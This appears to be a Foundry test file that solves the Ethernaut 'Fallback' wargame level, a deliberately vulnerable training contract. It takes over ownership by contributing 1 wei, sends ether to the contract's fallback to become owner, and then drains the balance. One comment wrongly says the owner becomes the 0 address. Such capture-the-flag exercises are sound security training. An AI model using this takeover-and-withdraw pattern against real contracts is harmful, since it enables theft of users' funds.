pragma solidity ^0.8.10;

import {LevelSetup} from "test/LevelSetup.sol";

import {Level} from "src/BaseLevel.sol";

import {FallbackFactory} from "src/Fallback/FallbackFactory.sol";
import {Fallback} from "src/Fallback/Fallback.sol";

contract FallbackTest is LevelSetup {
    Level level;

    function setUp() override public {
        super.setUp();
        level  = new FallbackFactory();
    }

    function testLevelHack() 
    createLevelContractAddress(level)
    submitLevelAfterwards public {
      
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);

        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // Verify contract owner has been updated to 0 address
        assertEq(ethernautFallback.owner(), eoaAddress);

        ethernautFallback.withdraw();    
    }
}
